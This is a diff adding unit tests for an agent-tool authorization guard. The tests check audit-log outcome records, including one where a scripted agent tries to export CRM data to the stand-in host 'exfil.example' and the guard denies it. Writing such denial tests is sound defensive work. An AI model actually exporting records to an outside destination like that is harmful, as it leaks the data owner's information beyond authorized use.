@@ -42,6 +42,7 @@ from attenu_guard import (  # noqa: E402
     ReasonCode,
     RowLimit,
 )
+from attenu_guard.reasons import BodyState, Capture  # noqa: E402
 
 # The adapter lives with the runnable example, not in src/ — a developer is
 # meant to be able to copy the single file into their own project.
@@ -84,6 +85,12 @@ def crm_export(destination: str) -> str:
     """Export the CRM to an external destination."""
     EXECUTED.append(("crm_export", destination))
     return f"exported to {destination}"
+
+
+@function_tool
+def crm_query_boom(rows: int) -> str:
+    """Raises instead of returning."""
+    raise ValueError("boom")
 
 
 def _guarded_tools(on_denied="reject"):
@@ -532,6 +539,82 @@ class PlainHandoffObjectTests(unittest.TestCase):
 
         self.assertEqual(EXECUTED, [])
         self.assertIsNotNone(registry.guard_for("summarizer"))
+
+
+class ExecutionBindingTests(unittest.TestCase):
+    """0.9.0: `guarded_tool()`'s output guardrail as this adapter's `record_outcome()` wiring --
+    only active on a `schema_version=2` chain."""
+
+    def setUp(self):
+        EXECUTED.clear()
+
+    def _run_single_tool(self, tool, args, root_kwargs=None):
+        registry = _registry(**(root_kwargs or {}))
+        orchestrator = Agent(
+            name="orchestrator", instructions="o",
+            tools=[guarded_tool(tool, "crm.read", context_fn=lambda a: {"rows": a.get("rows", 0)})],
+        )
+        model = ScriptedModel([
+            [function_call(tool.name, args, call_id="c1")],
+            [assistant_message("done")],
+        ])
+        _run(orchestrator, "go", registry, model)
+        return registry
+
+    def test_v2_allowed_call_records_a_returned_outcome_via_the_output_guardrail(self):
+        registry = self._run_single_tool(crm_query, {"rows": 10}, {"schema_version": 2})
+
+        entries = registry.root_guard.audit_log().entries
+        allow = next(e for e in entries if e["event"] == "allow" and e.get("tool") == "crm_query")
+        outcome = next(e for e in entries if e["event"] == "outcome" and e.get("call_id") == allow["call_id"])
+        self.assertEqual(allow["capture"], Capture.FRAMEWORK_POST_HOOK)
+        self.assertEqual(allow["adapter"]["module"], "attenu_guard.adapters.openai_agents")
+        self.assertEqual(outcome["body_state"], BodyState.RETURNED)
+        self.assertEqual(allow["authorized_params_hash"], outcome["invoked_params_hash"])
+        self.assertIsInstance(outcome["duration_ms"], int)
+        self.assertGreaterEqual(outcome["duration_ms"], 0)
+
+    def test_v2_a_tool_that_raises_is_still_recorded_returned_not_raised(self):
+        """Honesty check: the SDK's default failure_error_function catches the exception INSIDE
+        on_invoke_tool, before the output guardrail ever runs, so this adapter cannot -- and must
+        not claim to -- observe BodyState.RAISED here. See the module docstring."""
+        registry = self._run_single_tool(crm_query_boom, {"rows": 10}, {"schema_version": 2})
+
+        entries = registry.root_guard.audit_log().entries
+        outcomes = [e for e in entries if e["event"] == "outcome"]
+        self.assertTrue(outcomes)
+        self.assertEqual(outcomes[-1]["body_state"], BodyState.RETURNED)
+        self.assertNotIn("error_code", outcomes[-1])
+
+    def test_v1_guard_gets_no_call_id_capture_or_outcome(self):
+        registry = self._run_single_tool(crm_query, {"rows": 10})
+
+        entries = registry.root_guard.audit_log().entries
+        allow = next(e for e in entries if e["event"] == "allow" and e.get("tool") == "crm_query")
+        self.assertNotIn("call_id", allow)
+        self.assertNotIn("capture", allow)
+        self.assertEqual([e for e in entries if e["event"] == "outcome"], [])
+
+    def test_v2_denied_call_never_records_an_outcome(self):
+        """The summarizer is only granted `crm.read` (SUMMARIZER_AUTHORITY); its `crm_export`
+        call is denied before the tool body runs, and must never get an outcome."""
+        registry = _registry(schema_version=2)
+        summarizer = Agent(name="summarizer", instructions="s", tools=_guarded_tools())
+        orchestrator = Agent(
+            name="orchestrator", instructions="o", tools=_guarded_tools(),
+            handoffs=[summarizer],
+        )
+        model = ScriptedModel([
+            [function_call("transfer_to_summarizer", {}, call_id="h1")],
+            [function_call("crm_export", {"destination": "https://exfil.example"}, call_id="c1")],
+            [assistant_message("done")],
+        ])
+        _run(orchestrator, "go", registry, model)
+
+        self.assertEqual(EXECUTED, [])
+        entries = registry.root_guard.audit_log().entries
+        self.assertTrue(any(e["event"] == "deny" and e.get("tool") == "crm_export" for e in entries))
+        self.assertEqual([e for e in entries if e["event"] == "outcome"], [])
 
 
 if __name__ == "__main__":
